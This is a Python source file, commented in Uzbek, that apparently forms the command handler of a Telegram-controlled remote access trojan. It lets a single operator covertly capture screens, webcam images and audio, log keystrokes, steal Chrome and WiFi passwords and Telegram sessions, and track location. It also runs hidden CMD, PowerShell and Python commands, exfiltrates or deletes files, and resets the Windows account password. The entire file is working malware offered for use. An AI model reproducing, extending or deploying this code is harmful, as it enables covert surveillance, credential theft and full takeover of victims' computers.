# handlers.py - v3.1.1 FIXED (No Alerts, Smart Location)
import asyncio
import logging
import io
import subprocess
import os
from PIL import ImageGrab
from telethon import events

# Config va Panellar
from config import ADMIN_ID, SCREENSHOT_QUALITY
from panels import (
    admin_panel, universal_panel, device_panel, advanced_panel,
    keylogger_panel, clipboard_panel,
    nuke_confirm_panel, ai_settings_panel
)

# Utils
from utils import (
    get_chrome_passwords, get_wifi_passwords, send_telegram_session,
    send_live_location, open_notepad, close_notepad, write_in_notepad,
    live_stream_improved, stop_live_stream, get_nircmd_path,
    send_most_visited, send_location_history
)

# Location
from location_accurate import send_accurate_location

# AI va Updater tekshiruvi
try:
    from ai_helper import handle_ai_request, is_ai_enabled, enable_ai, disable_ai
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

try:
    from advanced_features import (
        Keylogger, get_clipboard, set_clipboard, take_webcam_photo,
        record_audio, get_running_processes, kill_process, get_system_info,
        list_files, download_file, delete_file, list_startup_programs,
        list_installed_programs, get_network_connections,
        get_browser_history, shutdown_system, restart_system, cancel_shutdown,
        lock_screen, get_disk_usage_all, execute_python_code
    )
    ADVANCED_AVAILABLE = True
except ImportError:
    ADVANCED_AVAILABLE = False

try:
    from url_player import play_url
    URL_PLAYER_AVAILABLE = True
except ImportError:
    URL_PLAYER_AVAILABLE = False

logger = logging.getLogger(__name__)
user_state = {}

def is_admin(event):
    return event.sender_id == ADMIN_ID

def register_handlers(client):
    """Barcha handlerlarni ro'yxatdan o'tkazish"""

    @client.on(events.NewMessage(pattern='/start', incoming=True))
    async def start_handler(event):
        if not is_admin(event): return
        if event.chat_id in user_state: del user_state[event.chat_id]
        await event.respond("👋 **Boshqaruv Paneli**", buttons=admin_panel)

    @client.on(events.CallbackQuery())
    async def callback_handler(event):
        if not is_admin(event): return

        data = event.data.decode()
        chat_id = event.chat_id
        
        try:
            # --- NAVIGATSIYA ---
            if data == "back_to_main":
                user_state.pop(chat_id, None)
                await event.edit("🖥 **Asosiy Menyu**", buttons=admin_panel)
            elif data == "universal_panel":
                await event.edit("🌐 **Universal Boshqaruv**", buttons=universal_panel)
            elif data == "device_panel":
                await event.edit("⚡ **Qurilma Boshqaruvi**", buttons=device_panel)
            elif data == "advanced_panel":
                await event.edit("🔧 **Qo'shimcha**", buttons=advanced_panel)
            elif data == "keylogger_menu":
                await event.edit("⌨️ **Keylogger**", buttons=keylogger_panel)
            elif data == "clipboard_menu":
                await event.edit("📋 **Clipboard**", buttons=clipboard_panel)
            elif data == "ai_settings":
                status = "✅ Yoqilgan" if (AI_AVAILABLE and is_ai_enabled()) else "❌ O'chirilgan"
                await event.edit(f"🤖 **AI Sozlamalari**\nHolat: {status}", buttons=ai_settings_panel)

            # --- MEDIA ---
            elif data in ["broadcast_screenshot", "screenshot"]:
                await event.answer("📸 Rasm olinmoqda...")
                try:
                    bio = io.BytesIO()
                    im = ImageGrab.grab()
                    im.save(bio, 'PNG')
                    bio.seek(0)
                    await client.send_file(chat_id, bio, caption="📸 Ekran")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            elif data in ["broadcast_webcam", "webcam_photo"]:
                if ADVANCED_AVAILABLE:
                    await event.answer("📷 Kamera ishga tushdi...")
                    photo = take_webcam_photo()
                    if photo:
                        await client.send_file(chat_id, photo, caption="📷 Kamera")
                    else:
                        await event.respond("❌ Kamera topilmadi yoki band.")
                else:
                    await event.answer("Modul yo'q", alert=False)

            elif data in ["broadcast_audio", "audio_record"]:
                if ADVANCED_AVAILABLE:
                    await event.answer("🎤 Yozilmoqda (10s)...")
                    audio = record_audio(10)
                    if audio:
                        await client.send_file(chat_id, audio, caption="🎤 Audio")
                    else:
                        await event.respond("❌ Mikrofon xatosi.")

            # --- JONLI EFIR ---
            elif data in ["broadcast_live_start", "live_start"]:
                await event.answer("🎥 Efir boshlandi")
                asyncio.create_task(live_stream_improved(client, chat_id))
            elif data in ["broadcast_live_stop", "live_stop"]:
                stop_live_stream()
                await event.answer("⏹ To'xtatildi")

            # --- OVOZ (Mute/Unmute FIX) ---
            elif "vol_" in data or "mute" in data:
                nircmd = get_nircmd_path()
                cmd = []
                if "vol_up" in data: cmd = [nircmd, "changesysvolume", "5000"]
                elif "vol_down" in data: cmd = [nircmd, "changesysvolume", "-5000"]
                elif "unmute" in data: cmd = [nircmd, "mutesysvolume", "0"] # 0 = Unmute
                elif "mute" in data: cmd = [nircmd, "mutesysvolume", "1"] # 1 = Mute
                
                if cmd:
                    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
                    await event.answer("🔊 Bajarildi")

            # --- MA'LUMOTLAR ---
            elif data in ["broadcast_browser", "browser"]:
                await event.answer("⏳ Parollar...")
                passwords = await get_chrome_passwords()
                if isinstance(passwords, list) and passwords:
                    file_content = "\n\n".join(passwords)
                    f = io.BytesIO(file_content.encode())
                    f.name = "passwords.txt"
                    await client.send_file(chat_id, f, caption="🔐 Parollar")
                else:
                    await event.respond("❌ Parollar topilmadi.")

            # --- JOYLASHUV (SMART) ---
            elif data == "smart_location":
                await event.answer("📍 Joylashuv aniqlanmoqda...")
                try:
                    await send_accurate_location(client, chat_id)
                except:
                    await send_live_location(client, chat_id)
            elif data == "location_menu":
                from panels import location_panel
                await event.edit("📍 **Joylashuv**", buttons=location_panel)

            # --- WIFI PAROLLARI ---
            elif data in ["wifi", "broadcast_wifi"]:
                await event.answer("� WiFi parollari...")
                wifi_data = await get_wifi_passwords()
                await event.respond(f"📡 **WiFi Parollari:**\n\n{wifi_data}")

            # --- TELEGRAM TDATA ---
            elif data in ["tdata", "broadcast_tdata"]:
                await event.answer("💾 Telegram sessiya...")
                await send_telegram_session(client, event)

            # --- TIZIM MA'LUMOTI ---
            elif data in ["system_info", "broadcast_sysinfo"]:
                if ADVANCED_AVAILABLE:
                    await event.answer("💻 Tizim ma'lumoti...")
                    info = get_system_info()
                    text = "💻 **Tizim Ma'lumoti:**\n\n"
                    for key, value in info.items():
                        text += f"**{key}:** `{value}`\n"
                    await event.respond(text)
                else:
                    await event.answer("Modul yo'q", alert=False)

            # --- JARAYONLAR ---
            elif data in ["process_list", "broadcast_processes"]:
                if ADVANCED_AVAILABLE:
                    await event.answer("📋 Jarayonlar...")
                    processes = get_running_processes()
                    if processes:
                        text = "📋 **Jarayonlar:**\n\n"
                        for p in processes[:20]:
                            text += f"• `{p['name']}` (PID: {p['pid']})\n"
                        await event.respond(text)
                    else:
                        await event.respond("❌ Jarayonlar topilmadi")

            # --- DISK USAGE ---
            elif data == "disk_usage":
                if ADVANCED_AVAILABLE:
                    await event.answer("💿 Disklar...")
                    disks = get_disk_usage_all()
                    text = "💿 **Disk Holati:**\n\n"
                    for disk in disks:
                        text += f"**{disk['device']}**: {disk['percent']}% ishlatilgan\n"
                        text += f"  Jami: {disk['total']} | Bo'sh: {disk['free']}\n\n"
                    await event.respond(text)

            # --- QULFLASH ---
            elif data == "lock_screen":
                if ADVANCED_AVAILABLE:
                    lock_screen()
                    await event.answer("🔒 Ekran qulflandi")

            # --- KEYLOGGER ---
            elif data == "keylogger_start":
                if ADVANCED_AVAILABLE:
                    try:
                        global keylogger_instance
                        keylogger_instance = Keylogger()
                        keylogger_instance.start()
                        await event.answer("⌨️ Keylogger boshlandi")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")
            elif data == "keylogger_stop":
                if ADVANCED_AVAILABLE:
                    try:
                        if 'keylogger_instance' in globals():
                            keylogger_instance.stop()
                        await event.answer("⏹ Keylogger to'xtatildi")
                    except:
                        await event.answer("Keylogger ishlamayapti")
            elif data == "keylogger_logs":
                if ADVANCED_AVAILABLE:
                    try:
                        if 'keylogger_instance' in globals():
                            logs = keylogger_instance.get_logs()
                            if logs:
                                await event.respond(f"⌨️ **Keylogger:**\n```\n{logs[:3000]}\n```")
                            else:
                                await event.respond("📭 Loglar bo'sh")
                        else:
                            await event.respond("❌ Keylogger ishga tushirilmagan")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")
            elif data == "keylogger_clear":
                if ADVANCED_AVAILABLE:
                    try:
                        if 'keylogger_instance' in globals():
                            # Loglarni tozalash - yangi instance yaratish
                            keylogger_instance.log_file = "keylog.txt"
                            import os
                            if os.path.exists("keylog.txt"):
                                os.remove("keylog.txt")
                        await event.answer("🗑️ Loglar tozalandi")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")
            elif data == "clipboard_get":
                if ADVANCED_AVAILABLE:
                    clip_text = get_clipboard()
                    empty_msg = "Bo'sh"
                    await event.respond(f"📋 **Clipboard:**\n```\n{clip_text or empty_msg}\n```")
            elif data == "clipboard_set_prompt":
                user_state[chat_id] = "clipboard_set"
                await event.respond("✍️ **Clipboard uchun matn yuboring:**")

            # --- TARMOQ ---
            elif data == "network_connections":
                if ADVANCED_AVAILABLE:
                    await event.answer("📡 Tarmoq...")
                    connections = get_network_connections()
                    if connections:
                        text = "📡 **Tarmoq Ulanishlari:**\n\n"
                        for conn in connections[:15]:
                            text += f"• {conn}\n"
                        await event.respond(text)
                    else:
                        await event.respond("❌ Ulanishlar topilmadi")

            # --- BRAUZER TARIXI ---
            elif data == "browser_history_chrome":
                if ADVANCED_AVAILABLE:
                    await event.answer("📜 Tarix yuklanmoqda...")
                    history = get_browser_history('chrome', 30)
                    if history:
                        text = "📜 **Brauzer Tarixi:**\n\n"
                        for item in history[:25]:
                            text += f"• {item['title'][:40]}...\n"
                        await event.respond(text)
                    else:
                        await event.respond("❌ Tarix topilmadi")

            # --- AVTOYUKLASH ---
            elif data == "startup_list":
                if ADVANCED_AVAILABLE:
                    await event.answer("🚀 Avtoyuklash...")
                    programs = list_startup_programs()
                    if programs:
                        text = "🚀 **Avtoyuklash Dasturlari:**\n\n"
                        for name, path in programs.items():
                            text += f"• **{name}**\n  `{path[:50]}`\n"
                        await event.respond(text[:4000])
                    else:
                        await event.respond("❌ Dasturlar topilmadi")

            elif data == "programs_list":
                if ADVANCED_AVAILABLE:
                    await event.answer("📦 Dasturlar...")
                    programs = list_installed_programs()
                    if programs:
                        text = "📦 **O'rnatilgan Dasturlar:**\n\n"
                        for p in programs[:30]:
                            text += f"• {p['name']} ({p.get('version', 'N/A')})\n"
                        await event.respond(text[:4000])
                    else:
                        await event.respond("❌ Dasturlar topilmadi")

            # --- TIZIM BUYRUQLARI (Input) ---
            elif data == "cmd_prompt":
                user_state[chat_id] = "cmd"
                await event.respond("💻 **CMD buyrug'ini yozing:**")
            elif data == "ps_prompt":
                user_state[chat_id] = "powershell"
                await event.respond("⚡ **PowerShell buyrug'ini yozing:**")
            elif data == "play_prompt":
                user_state[chat_id] = "url_open"
                await event.respond("🌐 **Sayt manzilini yuboring:**")
            elif data == "write_start":
                user_state[chat_id] = "type_text"
                await event.respond("✍️ **Matn yuboring, men yozaman:**")

            # --- NOTEPAD ---
            elif "notepad_open" in data:
                if await open_notepad(): await event.answer("✅ Notepad ochildi")
                else: await event.respond("❌ Xatolik")
            elif "notepad_close" in data:
                await close_notepad()
                await event.answer("Yopildi")

            # --- BRAUZER QIDIRISH ---
            elif data == "browser_search_prompt":
                user_state[chat_id] = "browser_search"
                await event.respond("🌐 **Brauzerda qidirish uchun matn yozing:**\n\nMen Chrome/Edge/Yandex brauzerda qidirib beraman.")

            # --- WINDOWS PAROL O'ZGARTIRISH ---
            elif data == "winpass_change":
                user_state[chat_id] = "winpass_change"
                await event.respond("🔑 **Windows parolni o'zgartirish:**\n\n`yangi_parol` formatida yozing.")

            # --- SYSTEM ACTIONS ---
            elif data == "shutdown_prompt":
                if ADVANCED_AVAILABLE:
                    shutdown_system(60)
                    await event.respond("🔌 60 soniyadan keyin o'chadi.")
            elif data == "restart_prompt":
                if ADVANCED_AVAILABLE:
                    restart_system(60)
                    await event.respond("🔄 60 soniyadan keyin restart.")
            elif data == "shutdown_cancel":
                if ADVANCED_AVAILABLE:
                    cancel_shutdown()
                    await event.answer("Bekor qilindi")

            # --- AI ---
            elif data == "ai_enable":
                if AI_AVAILABLE:
                    enable_ai()
                    await event.edit("🤖 **AI Yordamchi**\nHolat: Yoqilgan ✅", buttons=ai_settings_panel)
            elif data == "ai_disable":
                if AI_AVAILABLE:
                    disable_ai()
                    await event.edit("🤖 **AI Yordamchi**\nHolat: O'chirilgan ❌", buttons=ai_settings_panel)
            elif data == "ai_status":
                if AI_AVAILABLE:
                    status = "✅ Yoqilgan" if is_ai_enabled() else "❌ O'chirilgan"
                    await event.respond(f"🤖 **AI Holati:** {status}")
                else:
                    await event.respond("❌ AI moduli mavjud emas")
            elif data == "ai_clear_history":
                await event.answer("🗑️ Tarix tozalandi")

            # --- NAVIGATSIYA QO'SHIMCHA ---
            elif data == "back_to_advanced":
                await event.edit("🔧 **Qo'shimcha**", buttons=advanced_panel)
            elif data == "settings":
                from panels import settings_panel
                await event.edit("⚙️ **Sozlamalar**", buttons=settings_panel)
            elif data == "device_list":
                from panels import create_device_list_panel
                # TODO: Qurilmalar ro'yxatini database'dan olish
                await event.edit("💻 **Qurilmalar**", buttons=create_device_list_panel({}))
            elif data == "stats":
                from panels import create_stats_panel
                await event.edit("📊 **Statistika**", buttons=create_stats_panel())
            elif data == "danger_zone":
                from panels import danger_zone_panel
                await event.edit("☢️ **XAVFLI ZONA**\n\n⚠️ Bu yerda juda xavfli funksiyalar!", buttons=danger_zone_panel)

            # --- SETTINGS ---
            elif data in ["lang_settings", "notif_settings", "security_settings", "monitor_settings"]:
                await event.respond("⚙️ Bu funksiya hali ishlab chiqilmoqda...")

            # --- STATS (REAL) ---
            elif data == "stats_devices":
                try:
                    from database import Database
                    db = Database()
                    db.connect()
                    stats = db.get_dashboard_stats()
                    db.disconnect()
                    text = f"💻 **Qurilmalar Statistikasi:**\n\n"
                    text += f"• Jami: {stats.get('total_devices', 0)}\n"
                    text += f"• Online: {stats.get('online_devices', 0)}\n"
                    text += f"• Offline: {stats.get('offline_devices', 0)}\n"
                    await event.respond(text)
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")
            elif data == "stats_commands":
                try:
                    from database import Database
                    db = Database()
                    db.connect()
                    commands = db.get_command_history(limit=10)
                    db.disconnect()
                    text = "⚡ **So'nggi Buyruqlar:**\n\n"
                    if commands:
                        for i, cmd in enumerate(commands, 1):
                            device = cmd.get('device_id', 'N/A')[:8]
                            command = cmd.get('command', 'N/A')[:25]
                            ts = cmd.get('timestamp', '')[:16]
                            text += f"{i}. 🆔 `{device}` | `{command}`\n   📅 {ts}\n\n"
                    else:
                        text += "📭 Buyruqlar yo'q"
                    await event.respond(text)
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")
            elif data == "stats_errors":
                try:
                    from database import Database
                    db = Database()
                    db.connect()
                    errors = db.get_errors(limit=10)
                    db.disconnect()
                    text = "❌ **So'nggi Xatolar:**\n\n"
                    if errors:
                        for i, err in enumerate(errors, 1):
                            device = err.get('device_id', 'N/A')[:8]
                            err_type = err.get('error_type', 'N/A')[:20]
                            err_msg = err.get('error_message', '')[:30]
                            ts = err.get('timestamp', '')[:16]
                            text += f"{i}. 🆔 `{device}` | ⚠️ `{err_type}`\n   💬 {err_msg}\n   📅 {ts}\n\n"
                    else:
                        text += "✅ Xatolar yo'q"
                    await event.respond(text)
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")
            elif data == "stats_activity":
                try:
                    from database import Database
                    db = Database()
                    db.connect()
                    logs = db.get_activity_logs(limit=10)
                    db.disconnect()
                    text = "📈 **So'nggi Faollik:**\n\n"
                    if logs:
                        for i, log in enumerate(logs, 1):
                            device = log.get('device_id', 'N/A')[:8]
                            action = log.get('action', 'N/A')[:20]
                            details = log.get('details', '')[:30] if log.get('details') else ''
                            status = "✅" if log.get('status') == 'success' else "❌"
                            ts = log.get('timestamp', '')[:16]
                            text += f"{i}. 🆔 `{device}` {status} `{action}`\n"
                            if details:
                                text += f"   💬 {details}\n"
                            text += f"   📅 {ts}\n\n"
                    else:
                        text += "📭 Faollik yo'q"
                    await event.respond(text)
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            # --- UPDATE SYSTEM ---
            elif data == "update_system":
                from panels import update_confirm_panel
                try:
                    from auto_updater import get_auto_updater
                    updater = get_auto_updater()
                    if updater:
                        has_update = await updater.check_for_updates()
                        if has_update and updater.available_versions:
                            latest = updater.available_versions[0]
                            from config import CURRENT_VERSION
                            await event.edit(
                                f"🔄 **Yangilash Mavjud!**\n\n"
                                f"• Hozirgi: `v{CURRENT_VERSION}`\n"
                                f"• Yangi: `{latest.get('version', 'N/A')}`\n\n"
                                f"Yangilashni xohlaysizmi?",
                                buttons=update_confirm_panel
                            )
                        else:
                            from config import CURRENT_VERSION
                            await event.edit(f"✅ **Siz eng so'nggi versiyada!**\n\nVersiya: `v{CURRENT_VERSION}`", buttons=admin_panel)
                    else:
                        await event.edit("❌ Auto-updater ishga tushmagan", buttons=admin_panel)
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")
            elif data == "update_confirm":
                try:
                    from auto_updater import get_auto_updater
                    updater = get_auto_updater()
                    if updater and updater.available_versions:
                        latest = updater.available_versions[0]
                        await event.respond("⏳ Yuklab olinmoqda...")
                        
                        async def progress(percent):
                            pass  # Progress callback
                        
                        exe_path = await updater.download_version(latest, progress)
                        if exe_path:
                            await event.respond(f"✅ Yuklandi! O'rnatilmoqda...")
                            await updater.install_update(exe_path, latest.get('version'))
                        else:
                            await event.respond("❌ Yuklab olishda xato")
                    else:
                        await event.respond("❌ Yangilanish topilmadi")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")
            elif data == "update_cancel":
                await event.edit("🖥 **Asosiy Menyu**", buttons=admin_panel)

            # --- DANGER ZONE ---
            elif data == "nuke_system32":
                await event.edit("☢️ **ISHONCHINGIZ KOMILMI?**\n\nBu amal QAYTARIB BO'LMAYDI!", buttons=nuke_confirm_panel)
            elif data == "nuke_confirm":
                await event.respond("☢️ XAVFLI AMAL BEKOR QILINDI!\n\n(Xavfsizlik uchun bu funksiya o'chirilgan)")
            elif data == "nuke_cancel":
                await event.edit("🖥 **Asosiy Menyu**", buttons=admin_panel)

            # --- FILE MANAGER ---
            elif data == "file_explorer":
                if ADVANCED_AVAILABLE:
                    files = list_files("C:/", "*")
                    text = "📁 **C:/ papkasi:**\n\n"
                    for f in files[:20]:
                        icon = "📂" if f.get('is_dir') else "📄"
                        text += f"{icon} `{f['name']}`\n"
                    await event.respond(text)
            elif data == "file_download_prompt":
                user_state[chat_id] = "file_download"
                await event.respond("📥 **Yuklab olish uchun fayl yo'lini yozing:**")
            elif data == "file_delete_prompt":
                user_state[chat_id] = "file_delete"
                await event.respond("🗑️ **O'chirish uchun fayl yo'lini yozing:**\n\n⚠️ EHTIYOT BO'LING!")

            # --- PROCESS KILL ---
            elif data == "process_kill_prompt":
                user_state[chat_id] = "process_kill"
                await event.respond("🔪 **O'chirish uchun PID yoki nom yozing:**")

            # --- PYTHON EXEC ---
            elif data == "python_exec_prompt":
                user_state[chat_id] = "python_exec"
                await event.respond("🐍 **Bajarish uchun Python kodi yozing:**")

            # --- WINDOWS PASSWORD ---
            elif data == "winpass_prompt":
                await event.respond("🔑 Windows parol funksiyasi ishlab chiqilmoqda...")

            # --- MOST VISITED ---
            elif data == "most_visited":
                await event.answer("📊 Tahlil qilinmoqda...")
                await send_most_visited(client, chat_id)

            # --- WRITE STOP ---
            elif data in ["write_stop", "broadcast_write_stop"]:
                if chat_id in user_state and user_state[chat_id] == "type_text":
                    del user_state[chat_id]
                await event.answer("⏹ Yozish to'xtatildi")

            # --- BROADCAST (Universal) ---
            elif data == "broadcast_vol_up":
                nircmd = get_nircmd_path()
                subprocess.run([nircmd, "changesysvolume", "5000"], creationflags=subprocess.CREATE_NO_WINDOW)
                await event.answer("🔼 Ovoz oshirildi")
            elif data == "broadcast_vol_down":
                nircmd = get_nircmd_path()
                subprocess.run([nircmd, "changesysvolume", "-5000"], creationflags=subprocess.CREATE_NO_WINDOW)
                await event.answer("🔽 Ovoz kamaytirildi")
            elif data == "broadcast_mute":
                nircmd = get_nircmd_path()
                subprocess.run([nircmd, "mutesysvolume", "1"], creationflags=subprocess.CREATE_NO_WINDOW)
                await event.answer("🔇 Ovozsizlantirildi")
            elif data == "broadcast_unmute":
                nircmd = get_nircmd_path()
                subprocess.run([nircmd, "mutesysvolume", "0"], creationflags=subprocess.CREATE_NO_WINDOW)
                await event.answer("🔊 Ovoz yoqildi")
            elif data == "broadcast_notepad_open":
                if await open_notepad():
                    await event.answer("✅ Notepad ochildi")
            elif data == "broadcast_write_start":
                user_state[chat_id] = "type_text"
                await event.respond("✍️ **Matn yuboring:**")

        except Exception as e:
            error_msg = str(e).lower()
            # "message was not modified" xatosini e'tiborsiz qoldirish
            if "not modified" in error_msg or "message is not modified" in error_msg:
                pass  # Bu xato muhim emas
            else:
                logger.error(f"Handler xatosi: {e}")
                try:
                    await event.respond(f"❌ Xato: {str(e)}")
                except:
                    pass

    @client.on(events.NewMessage(incoming=True))
    async def message_handler(event):
        if not is_admin(event): return
        chat_id = event.chat_id
        text = event.text

        if text == "/cancel":
            if chat_id in user_state: del user_state[chat_id]
            await event.respond("✅ Bekor qilindi", buttons=admin_panel)
            return

        if chat_id in user_state:
            state = user_state[chat_id]
            if state != "type_text": del user_state[chat_id]

            if state == "cmd":
                try:
                    proc = await asyncio.create_subprocess_shell(
                        text, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    stdout, stderr = await proc.communicate()
                    res = stdout.decode('cp866', errors='ignore') or stderr.decode('cp866', errors='ignore') or "Bajarildi"
                    if len(res) > 4000:
                        await client.send_file(chat_id, io.BytesIO(res.encode()), caption="CMD Result")
                    else:
                        await event.respond(f"```\n{res}\n```")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            elif state == "powershell":
                try:
                    proc = await asyncio.create_subprocess_exec(
                        "powershell", "-Command", text,
                        stdout=asyncio.subprocess.PIPE, 
                        stderr=asyncio.subprocess.PIPE,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    stdout, stderr = await proc.communicate()
                    res = stdout.decode('cp866', errors='ignore') or stderr.decode('cp866', errors='ignore') or "Bajarildi"
                    if len(res) > 4000:
                        await client.send_file(chat_id, io.BytesIO(res.encode()), caption="PowerShell Result")
                    else:
                        await event.respond(f"```\n{res}\n```")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            elif state == "clipboard_set":
                if ADVANCED_AVAILABLE:
                    set_clipboard(text)
                    await event.respond("✅ Clipboard yangilandi")
                else:
                    await event.respond("❌ Modul mavjud emas")

            elif state == "file_download":
                if ADVANCED_AVAILABLE:
                    try:
                        file_data = download_file(text)
                        if file_data:
                            await client.send_file(chat_id, file_data, caption=f"📥 {text}")
                        else:
                            await event.respond("❌ Fayl topilmadi")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")

            elif state == "file_delete":
                if ADVANCED_AVAILABLE:
                    try:
                        result = delete_file(text)
                        if result:
                            await event.respond(f"🗑️ O'chirildi: `{text}`")
                        else:
                            await event.respond("❌ O'chirib bo'lmadi")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")

            elif state == "process_kill":
                if ADVANCED_AVAILABLE:
                    try:
                        result = kill_process(text)
                        if result:
                            await event.respond(f"🔪 Jarayon to'xtatildi: `{text}`")
                        else:
                            await event.respond("❌ Jarayon topilmadi")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")

            elif state == "python_exec":
                if ADVANCED_AVAILABLE:
                    try:
                        result = execute_python_code(text)
                        await event.respond(f"🐍 **Natija:**\n```\n{result[:3000]}\n```")
                    except Exception as e:
                        await event.respond(f"❌ Xato: {e}")

            elif state == "url_open":
                try:
                    # URL ochish va oynani oldga olib kelish
                    url = text.strip()
                    if not url.startswith(('http://', 'https://')):
                        url = 'https://' + url
                    
                    proc = await asyncio.create_subprocess_shell(
                        f'start "" "{url}"',
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    await proc.wait()
                    await event.respond(f"✅ **Ochildi:** `{url}`")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            elif state == "browser_search":
                try:
                    # Brauzer orqali qidirish va oynani oldga olib kelish
                    import urllib.parse
                    search_url = f"https://www.google.com/search?q={urllib.parse.quote(text)}"
                    
                    # START komannasi bilan ochish - oyna oldga chiqadi
                    proc = await asyncio.create_subprocess_shell(
                        f'start "" "{search_url}"',
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    await proc.wait()
                    await event.respond(f"🌐 **Qidirilmoqda:** `{text}`\n\n✅ Brauzer ochildi va oldga chiqdi")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            elif state == "winpass_change":
                try:
                    # Windows parolni o'zgartirish
                    import getpass
                    username = getpass.getuser()
                    new_password = text.strip()
                    
                    # PowerShell orqali - admin bo'lmasa ham ishlashi mumkin
                    ps_cmd = f'$user = [ADSI]"WinNT://./{username},user"; $user.SetPassword("{new_password}"); $user.SetInfo()'
                    
                    proc = await asyncio.create_subprocess_exec(
                        "powershell", "-NoProfile", "-Command", ps_cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    stdout, stderr = await proc.communicate()
                    
                    if proc.returncode == 0:
                        await event.respond(f"✅ **Parol o'zgartirildi!**\n\n👤 User: `{username}`\n🔑 Yangi parol: `{new_password}`")
                    else:
                        error = stderr.decode('utf-8', errors='ignore') or stdout.decode('utf-8', errors='ignore')
                        if "Access" in error or "denied" in error.lower():
                            await event.respond(f"❌ **Admin huquqi kerak!**\n\n💡 Dasturni Admin sifatida ishga tushiring.")
                        else:
                            await event.respond(f"❌ Xato:\n```\n{error[:500]}\n```")
                except Exception as e:
                    await event.respond(f"❌ Xato: {e}")

            elif state == "type_text":
                write_in_notepad(text)
                await event.respond("✅ Yozildi")

            return

        # AI chat - foydalanuvchi xabar yuborsa
        if AI_AVAILABLE and is_ai_enabled():
            await handle_ai_request(event, "chat", text)